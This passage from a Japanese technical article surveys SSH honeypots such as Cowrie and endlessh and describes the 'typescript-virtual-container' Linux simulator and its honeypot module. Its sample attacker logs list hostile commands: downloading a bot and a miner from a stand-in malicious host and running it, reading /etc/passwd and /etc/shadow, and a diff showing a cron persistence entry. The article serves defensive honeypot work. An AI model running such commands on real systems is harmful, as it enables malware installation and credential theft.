socket.onmessage(msg => {
  // バックエンドからの出力----表示
  term.write(msg.data);
});
```

xterm.jsはレンダリングレイヤーのみ。シェルを実行しない。コマンドを解釈しない。好きなバックエンドに配線する表示ウィジェットだ。多くの人がxterm.jsが「ターミナルをやる」と思っているが、実際はただの画面----コマンドを実際に実行する何かに接続する必要がある。

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- PTY生成

`node-pty`はNode.jsで擬似端末（PTY）を生成し、それに対する読み書きハンドルを提供する。xterm.jsと組み合わせて、サーバー上で実行されている実際のシェル（bash、zsh、fish）と通信するブラウザターミナルを構築できる。

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // WebSocket経由でブラウザのxterm.jsに送信
  ws.send(data);
});

ws.on("message", data => {
  // ブラウザのキーストロークをシェルに転送
  shell.write(data);
});
```

これがクラウドIDEやWebターミナルの標準パターンだ：xterm.js（ブラウザ）↔ WebSocket ↔ node-pty ↔ 本物のbash。分離はない。シェルはNode.jsプロセス（またはそれを実行するユーザー）の全権限で動作する。

**メンテナンス**: Microsoft。  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## パート4 -- SSHハニーポット

ハニーポットは攻撃されるために設計されている。目標は、攻撃者が対話するのに十分リアルに見えつつ、脅威インテリジェンスのためにすべての行動を記録することだ。SSHは主要なターゲットだ。なぜならインターネット上で最も攻撃されるサービスだから----パブリックIPでポート22を公開すると、文字通り数分以内に自動スキャン試行が見える。試してみてほしい、どれだけ速いかちょっと怖くなるから。

ハニーポットの品質は2つのもので測定される：**忠実度**（どれだけ説得力を持って本物のシステムを装うか）と**テレメトリー**（どれだけ有用なデータをキャプチャするか）。これらはトレードオフの関係にある。高忠実度のハニーポットは構築が難しく、運用リスクも高い。

このセクションが、最終的に`typescript-virtual-container`に`HoneyPot`モジュールを構築するきっかけになったので、ここにはいくつか意見がある。

### 4.1 Cowrie -- 黄金基準

CowrieはPythonベースの中〜高インタラクションのSSHおよびTelnetハニーポットだ。研究・セキュリティコミュニティで最も広くデプロイされているSSHハニーポットだ。

アーキテクチャ：
- **プロトコル層**: 本物のSSHプロトコル実装（Twisted Conch）。攻撃者は本物のハンドシェイク、本物の鍵交換、本物の認証を得る。
- **シェル層**: 偽のファイルシステム（Debian 5.0を模倣）と、一般的なコマンドに応答する部分的なシェルインタプリタ。
- **プロキシモード**: 背後にある実際のシステムに転送（高インタラクションモード）、通過するすべてを記録。
- **LLMモード**（最近追加）: 言語モデルを使って、処理方法を知らないコマンドに動的な応答を生成。そう、CowrieにはAIモードがある。すごい時代だ。

```python
# Cowrieがキャプチャするもの
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrieはダウンロードされたファイル（wget/curl/SFTP/SCP経由）をマルウェア解析用に保存する。Splunk、Elasticsearch、その他のSIEMプラットフォームと統合する。

**忠実度**: 中〜高。自動ボットを騙すには十分（SSH攻撃者の99%はそうだ----ほとんどが`root`/`password`を試すだけの愚かなスクリプトだ）。洗練された人間はフィンガープリントできるが、たいていはすぐにバレる。

**言語**: Python（Twisted）  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- Cowrieの前身

Kippoはオリジナルの中インタラクションSSHハニーポットで、Cowrieのベースになった。同じ基本アイデア：本物のSSHプロトコル、偽のファイルシステム、部分的なシェル。Cowrieは完全にこれを取って代わった----Kippoはアーカイブされており、2026年に誰も実行すべきではない。古いブログ記事やセキュリティ論文で言及されているのを見かけるかもしれないので、歴史的完全性のためにここに挙げた。

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- アーカイブ

---

### 4.3 endlessh -- SSHターピット

endlesshは退化したハニーポットだ：バナーデータを毎秒1バイト（またはそれ以下）でゆっくりと滴下することで、SSH接続を開いたままにする。接続するSSHクライアントは無期限にハングする----サーバーがバナーの送信を終えないので、認証にすら到達できない。

目標は脅威インテリジェンスではなく、純粋なリソース拒否だ：攻撃者のスキャナースレッドを拘束し、実際のターゲットをより速く攻撃できないようにする。正直、最高に邪悪なやり方だ。攻撃者から何かを学ぶのではなく、ただ相手の時間を無駄にする。それには深い満足感がある。

```c
// endlesshのプロトコル動作の全て：
// 送信："SSH-2.0-OpenSSH_" そしてランダムな文字をゆっくり追加
// 接続を絶対に閉じない
// 攻撃者のスキャナーはN秒後にタイムアウト
```

コマンドはキャプチャされない。認証はテストされない。単なる接続時間の消費だ。

**言語**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- 「全員通せ」ハニーポット

sshesameはすべてのSSH接続を許可し（任意のユーザー名、任意のパスワード、任意のキー）、すべてをログに記録する。ゼロインタラクションのハニーポットだ：コマンドには応答せず、攻撃者を「中に入れる」だけで、タイプするすべてのキーストロークを記録する。

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  Username: root, Password: password123 -- accepted
  Commands typed:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

資格情報の収集に有用：ボットが試すユーザー名とパスワードがすぐに蓄積され、現在どのデフォルト資格情報が活発にブルートフォースされているかがわかる。ネタバレ：いつも`root`/`password`、`admin`/`admin`、`root`/`123456`だ。毎回。

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- Dockerベースのハニーポットフレームワーク

`lyrebird/honeypot-base`は、ネットワークサービスのハニーポットを構築するためのDockerベースイメージだ。特にSSHハニーポットというわけではない----任意のプロトコルのハニーポットを構築するためのフレームワークだ。

ベースイメージはロギングフレームワーク、プロトコル用プラグインシステム、マルチサービスハニーポット用のDocker Composeセットアップを提供する。特定のサービスを偽装するために拡張する。

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.jsでSSHハニーポットを構築する -- ナイーブな方法とその失敗

`typescript-virtual-container`以前は、Node.jsでSSHハニーポットを構築するには、実際の`ssh2`ライブラリと手動のコマンド偽装を組み合わせる必要があった。非常に面倒で、非常に不完全だ。でも……今や通過儀礼みたいなものだ：

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 試行を記録
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 全員通せ
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 偽の応答
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

これは資格情報とコマンドをキャプチャするという意味で「機能する」。しかし、洗練された攻撃者がちょっと突いた瞬間に明らかに偽物だとわかる。`uname -a`は正しい文字列を返すが、`ls /etc`は「command not found」----これは自白だ。ファイルシステムが存在しない。コマンドはチェーンできない。パイプは機能しない。変数は展開されない。

熟練した攻撃者は最初の5コマンドであなたのハニーポットをフィンガープリントする。Cowrie的な振る舞いをチェックする自動スクリプトも即座に検出する。どうやらこれが、`typescript-virtual-container`の作者を、コマンドを実際に解釈するものを作る方向に押しやったらしい----詳しくはパート5で。

---

### ハニーポットファミリーまとめ

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | ナイーブssh2 |
|---|---|---|---|---|---|---|
| **インタラクション度** | 中〜高 | 中 | ゼロ | ゼロ | 様々 | 低 |
| **本物のSSHプロトコル** | ✅ | ✅ | ❌（ターピット） | ✅ | 様々 | ✅ |
| **シェルの忠実度** | 中 | 中 | n/a | なし | 様々 | 最小限 |
| **資格情報のキャプチャ** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **コマンドのキャプチャ** | ✅ | ✅ | ❌ | ✅ | 様々 | ✅ |
| **マルウェアのキャプチャ** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM統合** | ✅ ネイティブ | ❌ | ❌ | ❌ | ❌ | 手動 |
| **LLM応答** | ✅（新機能） | ❌ | ❌ | ❌ | ❌ | ❌ |
| **言語** | Python | Python | C | Go | Docker | Node.js |
| **Node.jsネイティブ** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ステータス** | ✅ 非常に活発 | ⚠️ アーカイブ | ✅ 活発 | ✅ 活発 | ✅ 活発 | DIY |

パターンは明らかだ：より忠実度を求めるほど、より多くのPythonを書く必要がある。真剣にやるならCowrieが明らかな勝者だ----長年戦場で試されてきて、資格情報以上のものをキャプチャする。endlesshとsshesameは本格的な脅威インテルツールというより楽しいサイドプロジェクトだ。ナイーブなNode.jsアプローチは壁にぶつかるまでにせいぜい20%程度しか到達しない。

---

## パート5 -- `typescript-virtual-container`：ギャップを埋めるもの

さて、ここからが面白いところだ。上記の全ファミリーをカタログ化した後、欠落している象限がかなり明らかになる：

- JSサンドボックス：コードを分離するが、シェルなし、ファイルシステムなし、SSHなし
- Linuxエミュレーター：本物のOS、本物のシェル、本物のSSH……でも150+ MB RAM、30秒の起動時間、そしてシリアルI/Oの上に独自APIを構築する必要あり
- ハニーポット：偽のシェル、プログラム可能なAPIなし、Python/Go/C、Nodeネイティブではない

完全で、プログラム可能で、NodeネイティブなLinux環境----本物のSSH、本物のパーミッション、本物の仮想ネットワーキング、型付きTypeScript APIを持つもの----を構築した人はいなかった。だから彼女が作った。

簡単な紹介：これはこの記事で初めてちゃんと彼女に言及するから：`typescript-virtual-container`は[Chloé Rolzhausen](https://itsrealfortune.fr)によって作られた。フランスの開発者で、オンラインでは**Fortune**（またはItsRealFortune）として知られている。[彼女のウェブサイト](https://itsrealfortune.fr)と[LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//)で見つけられる。プロジェクト全体----56k行のTypeScript、247ファイル、170コマンド----は一人の個人による単独の努力だ。この記事の残りでは彼女をFortuneと呼ぶ。そしてそう、ちょっとすごい。彼女の作品をチェックしてみて！

### 実際のところ、それは何なのか

`typescript-virtual-container`は**Linux環境シミュレーター**で、純粋なTypeScriptで書かれている。Wasmなし。ネイティブアドオンなし。カーネルなし。247のTypeScriptファイルにわたる約56,000行のソース。

重要な洞察：`ls /etc | grep passwd`を機能させるのにCPUエミュレーターは必要ない。必要なもの：
1. パス操作に応答するメモリ内ノードのツリー
2. すべてのアクセスで強制されるPOSIXパーミッションモデル
3. パイプライン、リダイレクション、サブシェル、変数展開を理解するシェルパーサー
4. ~170のコマンド実装（関数であってバイナリではない）
5. ユーザーとグループの管理システム
6. これらすべてをSSH経由で公開する仕組み

これらはすべて、カーネルの関与なしに純粋なTypeScriptで達成可能だ。

### VirtualFileSystem

VFSは型付きノードのメモリ内ツリー----明示的に`"fs"`永続モードを有効にしない限り、ディスクI/Oはない：

```ts
// 簡略化された内部表現
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 遅延ロードされるプレースホルダー
```

すべてのパス操作は`normalizePath`（`.`、`..`、シンボリックリンクを解決）と`enforceAccess`（要求元のuid/gidに対する読み取り/書き込み/実行パーミッションをチェック）を通過する。`chmod`、`chown`、スティッキービット、setuidはすべて実装されており、実際に強制される。uid 1000のプロセスが、モード0600のroot所有ファイルを読み取ろうとすると、EACCESが返る----偽のEACCESではなく、パーミッションチェックからスローされる本物のJavaScript `Error`だ。その部分はかなりエレガントだと思う。

VFSは以下の形式にシリアライズされる：
- `.vfsb` -- コンパクトなバイナリ形式（カスタム、fflate圧縮）----これがデフォルト
- JSONスナップショット -- 人間が読める、デバッグに便利
- TARアーカイブ -- 実際のtar形式でのインポート/エクスポート。`tar -xf`すればVFSに……そのファイルが現れる
- SquashFSイメージ -- 読み取り専用インポート

`"fs"`永続モードでは、クラッシュリカバリ用の書き込み先行ジャーナル（WAL）を維持する----書き込みはまずジャーナルに送られ、フラッシュ時にスナップショットに書き込まれる。Nodeが途中でクラッシュしても、ジャーナルで最後の完全な状態を再構築できる。

ディスクI/Oレイテンシをシミュレートする`FileCache`レイヤーもある。`NVME_DISK_IO`や`HDD_DISK_IO`のようなプロファイルを設定すると、VFSがファイル操作を意図的に遅延させ、現実的なタイミングに合わせる。ソフトウェアが自らを遅くしてハードウェアをシミュレートするというのはちょっと面白いが、ベンチマークには非常に便利だ。

### シェルインタプリタ

シェルパーサーは型付きASTを生成する：

```ts
// "ls /etc | grep root && echo done" は以下にパースされる：
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

実行エンジンはこのASTを歩く：
- パイプラインの場合、`{ stdin, stdout, stderr }`ストリームのチェーンを作成し、パイプI/Oで各コマンドを実行
- 論理演算子（`&&`、`||`）の場合、右側を実行する前に左側の`$?`をチェック
- サブシェル（`$(...)`、`` ` ` ``）の場合、実行コンテキストをフォーク
- リダイレクション（`>file`、`>>file`、`2>&1`、`<file`）の場合、実行前にストリーム配線をセットアップ
- バックグラウンドジョブ（`cmd &`）の場合、完了を待たずに実行
- 変数の場合、`$VAR`、`${VAR:-default}`、`${#VAR}`、算術`$((expr))`を展開
- ブレース展開（`{a,b,c}`、`{1..5}`）の場合、実行前に完全な展開リストを生成

これらはすべて本物のPOSIXシェル動作だ。パーサーはヒアドキュメント、プロセス置換、グロビング（`*`、`?`、`[abc]`）、引用符処理（シングルクォート、補間付きダブルクォート、バックスラッシュエスケープ）を処理する。完璧ではない----エッジケースは存在する----が、TypeScriptプロジェクトから期待されるものをはるかに超えている。

### ~170の組み込みコマンド

コマンドはコマンドレジストリに登録されたTypeScript関数だ。stdin/stdout/stderrストリーム、VFS、ユーザーセッション、シェル環境、サブモジュールへのアクセスを持つ`CommandContext`を受け取る。

170のUnixコマンド実装を書くのは……大変だ。簡単なものもある（`echo`、`true`、`false`）、驚くほど複雑なものもある（`awk`、`find`、`tar`）。完全なPOSIX `awk`？TypeScriptで？それは正気の沙汰じゃない。以下が含まれているものの一部：

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (クライアント側、外部接続),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (スタブ), python3 (スタブ), node (スタブ),
nano (完全な対話型エディタ), vim (基本), vi (基本),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (シミュレート), systemctl (スタブ), journalctl (スタブ),
...さらに~130以上
```

「スタブ」（git、python3、node）は一般的な呼び出しに現実的に応答する----`python3 --version`は信憑性のあるバージョン文字列を返し、`git status`は偽のリポジトリ状態を表示する----実際の作業は行わない。ハニーポットでは、これらは実際のものよりも有用だ。なぜなら、実際に有害なものを実行せずに、攻撃者が何を実行しようとするかを観察できるからだ。

### SSHサーバー

SSHレイヤーは実際の`ssh2` npmパッケージを使用する----実際のSSHプロトコル、実際の鍵交換、実際の暗号化。`SSHMimic`がそれをラップする：

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 本物のSSH: ssh -p 2222 root@localhost
// 本物のSFTP: sftp -P 2222 root@localhost
// 本物のSCP: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`は`uname -a`、`lsb_release -a`、`neofetch`、`/proc/version`、`/etc/os-release`が報告する内容を決定する。任意のLinuxディストリビューションとカーネルバージョンを説得力を持って偽装できる----実際のSSHクライアントからは、文字通り違いを見分ける方法がない。

### HoneyPotモジュール

シェルインタプリタが本物でSSHサーバーが本物なので、攻撃者のコマンドは仮想環境内で実際に実行される。攻撃者がトリガーした`wget`リクエストは宛先URLとともに記録される。攻撃者が作成したファイルはVFSに保存される。攻撃者の権限昇格の試みは現実的なエラーを生成する。

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// セッション後、ファイルシステムの差分を取る
const before = shell.vfs.toSnapshot();
// ... 攻撃者セッション ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

これはCowrieとは質的に異なる。Cowrieの偽ファイルシステムは`ls`に応答できるが、攻撃者がどのファイルを作成し、どのような変更を構造化された差分として加えたかを実際に追跡することはできない。`typescript-virtual-container`はそれができる。なぜならVFSが生きたデータ構造であり、すべての書き込みが追跡されるからだ。攻撃者が追加したcronエントリ？差分に含まれている。あの`.hidden`フォルダ？差分に含まれている。マルウェア解析にかなり便利だ。

### 仮想ネットワークスタック

これはプロジェクト全体でおそらく最も印象的な部分であり、この分野の他のどのプロジェクトにも相当するものがない。完全なL2/L3仮想ネットワークスタックにVPNサポートまで付いて、純粋なTypeScriptで書かれ、実際のネットワークアダプターは関与していない。これは本当にすごい。

`VirtualNetworkManager`は各`VirtualShell`インスタンスに仮想ネットワークインターフェースを提供し、設定可能なIPアドレス、ルーティングテーブル、ソフトウェアファイアウォール（conntrackとNAT付きiptablesスタイルのルール）を持つ。`ip addr`、`ip route`、`iptables -L`、`netstat -rn`はすべて仮想ネットワーク状態を表示する。

`VirtualSwitch`（Baieという名前----フランス語でサーバーラックベイ「baie informatique」から）は、複数のシェルを共有サブネット上で接続する。以下を実装：
- MACラーニングとARP
- サブネット間のIPルーティング
- NAT（送信元マスカレード）
- DNS（サブネットごとに設定可能なレコード）
- ロードバランシング（ラウンドロビン、最小接続数）
- トラフィックシェーピング：レイテンシ、ジッター（ガウス分布）、パケットロス、バーストロス、並び替え、重複
- 帯域幅制限（トークンバケット）
- MTU強制
- コネクショントラッキング（ステートフル、NEW/ESTABLISHED/TIME_WAIT状態付き）

```ts
const baie = new Baie("192.168.0.0/24");

// 同じスイッチ上の3台の仮想マシン
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// ファイアウォール：webはapiに到達でき、apiはdbに到達できるが、webはdbに直接到達できない
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// トラフィックシェーピング：外部への不安定なWANリンクをシミュレート
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`はBaieインスタンス間の暗号化トンネルを作成する----サイト間VPNインターコネクトを持つマルチサイトネットワークをシミュレートできる。

`VirtualProxy`はポート転送とSOCKS5プロキシを実装する。

どれも実際のネットワークアダプターには触れない。すべてTypeScriptのオブジェクトルーティングだ。`ping`コマンドは仮想スイッチを経由してルーティングされ、シミュレートされたICMP応答を返すことで「動作する」。`curl http://192.168.0.3/api`は仮想ネットワークを通ってルーティングされ、apiシェルのシミュレートされたHTTP応答にヒットし、コンテンツを返す。すべてが入れ子構造で、最高にクールだ。

### SandboxedShell

より強い分離が必要なプログラム的な使用のために、`SandboxedShell`はNode.js Workerスレッド内でシェルセッションを実行する：

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 1コアの25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

ここでの分離はVFSレイヤー（Workerスレッドのシェルは仮想ファイルシステムのみを見ることができ、ホストファイルシステムには決してアクセスできない）とNode.js Workerスレッドのメモリ分離によって強制される。これは`isolated-vm`より軽量だが、JSレベルの分離ではなくシェルレベルの分離にはより適している。

### リソース制限

シェルごとに設定可能なリソース制限があり、システム監視コマンドが報告する内容に影響する：

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

そのシェル内で、`free -m`は合計512 MBのRAMを表示する。`nproc`は2を返す。`/proc/meminfo`は制限された値を示す。`htop`と`top`は制限されたCPU数を表示する。これにより、偽のマシンのハードウェアプロファイルを正確に設定できる。

### 3つのデプロイモード

```
モード1: SSH/SFTPサーバー
  VirtualSshServer / VirtualSftpServer
  → 本物のSSHプロトコル、本物のSFTP、本物のSCP
  → ユースケース：ハニーポット、リモートテスト環境、訓練ラボ

モード2: Webシェル（ブラウザ）
  builds/fortune-nyx-v1.7.6-web.min.js（ESMバンドル）
  → ブラウザで動作、VFSはIndexedDBに永続化
  → ユースケース：対話型チュートリアル、埋め込みターミナル、デモ
  → おまけ：startxfce4で完全なシミュレートXFCEデスクトップを実行可能

モード3: スタンドアロンCLI
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs（単一ファイル、インストール不要）
  → curlして実行、VFSは.vfs/ディレクトリに永続化
  → ユースケース：クイックデモ、ローカル実験
```

### ポリフィル----Wasmなしでブラウザビルドが動く仕組み

これは本当に賢いと思った部分で、特に取り上げたかった。

Node.jsライブラリをブラウザで動作させるのは通常悪夢だ。Wasmランタイムを使うか（重い、ロードが遅い）、すべての`node:*`インポートを手動でブラウザ互換の代替品に置き換えるのに数週間費やすか。Fortuneは2番目の方法を選んだ----だが非常にクリーンに、リポジトリの`polyfills/`ディレクトリに置かれたカスタムポリフィルセットを書くことで実現した。

ビルドパイプラインは、大量の`alias`エントリを持つ単なるesbuildだ：

```js
// demo/build.js -- ブラウザビルド設定全体
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasmなし。外部ポリフィルライブラリなし。`webpack-node-externals`の意味不明な設定なし。エイリアスされたモジュールといくつかの注入されたグローバルだけだ。それぞれを見ていこう----いくつかは本当に印象的だから。

**`node:fs` -- 偽のファイルシステムとしてのIndexedDB**

これがお気に入りだ。`node:fs`ポリフィルは同期的なNode.js fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`...）を実装し、2つのレイヤーで動作する：同期的な読み取り用のインメモリ`Map`と、ページリロード間の永続化用のIndexedDB。書き込みは即座にMapにヒットし（`writeFileSync`の直後の`readFileSync`は常に機能する）、その後バックグラウンドで非同期的にIndexedDBにフラッシュされる。

```js
// 同期キャッシュ（path → Uint8Array | null）----即時読み取り
const memCache = new Map();

// 起動時にIndexedDBからmemCacheにすべてをプリロード
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

これが、ブラウザでVFSスナップショットがページリロード後も存続する理由だ----`.vfsb`バイナリ全体がこのポリフィル経由でIndexedDBに書き込まれ、次回のロードで読み戻される。Wasmなし。サーバーなし。2011年からすべてのブラウザにあるIndexedDBだけだ。

**`node:crypto` -- 純粋JSのSHA-256**

Wasm暗号ライブラリを取り込む代わりに、cryptoポリフィルはFIPS 180-4のラウンド定数を使用してSHA-256をスクラッチから実装している。166行の純粋JSで、完全なhex/base64/Uint8Array出力サポート付き。ライブラリ内のすべてのハッシュ処理はこれを通る----SSHホストキーのフィンガープリンティング、内部チェックサム、すべて。コンパクトで、ゼロ依存、ただ動く。

**`node:os` -- ブラウザの実際のハードウェアを読み取る**

これがいい感じのタッチだ。ハードコードされたプレースホルダー値を返す代わりに、`node:os`は`navigator.deviceMemory`から総RAMを、`navigator.hardwareConcurrency`からCPU数を読み取る。つまりブラウザビルド内の`neofetch`が、実際のマシンに対応する何かを報告する----作り物の「2コア、2GB RAM」スタブではない。

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB フォールバック
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // navigator.userAgentも解析してCPUモデル文字列を推測
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`、`ssh2`、`roxify` -- 正直なスタブ**

ブラウザはTCPソケットを開けず、本物のSSHも実行できない。そのためこれらは、誰かが使おうとすると明確なメッセージとともに`NotImplemented`エラーをスローするスタブだ。サイレント障害なし、オブジェクトが期待される場所で`undefined`が返ることもない。ただ大声で明確な「これはブラウザでは動かない」というメッセージ----まさに欲しいものだ。

**`process.js`と`buffer.js` -- 注入されるグローバル**

これら2つはesbuildの`inject`オプションを介してすべてのバンドルファイルの先頭に注入されるので、`process`と`Buffer`は明示的なインポートなしでグローバルに利用可能だ。`process.js`は小さい：`env`、`version`、`platform: 'browser'`、`queueMicrotask`経由の`nextTick`、`performance.now()`経由の`uptime`。`buffer.js`は`Uint8Array`の上に構築された完全な`Buffer`再実装----SSH実装とVFSが依存するすべての`readUInt32BE`、`writeInt16LE`、hex/base64エンコーディングメソッド。

---

ポリフィルセット全体は合計約640行の手書きJSだ。npmパッケージなし。Wasmなし。そして結果は、ライブラリそのものをネイティブに実行するブラウザバンドルで、Nodeファーストのライブラリによくある「でもブラウザで本当に動くの？」という不安が一切ない。興味があればリポジトリの`polyfills/`フォルダを見てみるといい----各ファイルは自己完結していて読みやすい。これは個人的に非常に評価しているスタイルの選択だ。

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **カテゴリ** | JSサンドボックス | JSサンドボックス | JSサンドボックス | エミュレーター | エミュレーター | Node.js/Wasm | ハニーポット | シミュレーター |
| **JSの分離** | ⚠️ スコープ | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | 部分的 | n/a | ✅ Worker |
| **本物のLinuxカーネル** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **シェルインタプリタ** | ❌ | ❌ | ❌ | ✅（本物） | ✅（本物） | ✅（本物） | 部分的 | ✅（カスタム） |
| **~170のUnixコマンド** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分的 | ~20 | ✅ |
| **POSIXパーミッション** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分的 | ✅ 強制 |
| **ユーザー管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小限 | ✅ 完全 |
| **本物のSSHサーバー** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ハニーポット/監査** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS差分/スナップショット** | ❌ | ❌ | ❌ | 限定的 | ❌ | ❌ | ❌ | ✅ |
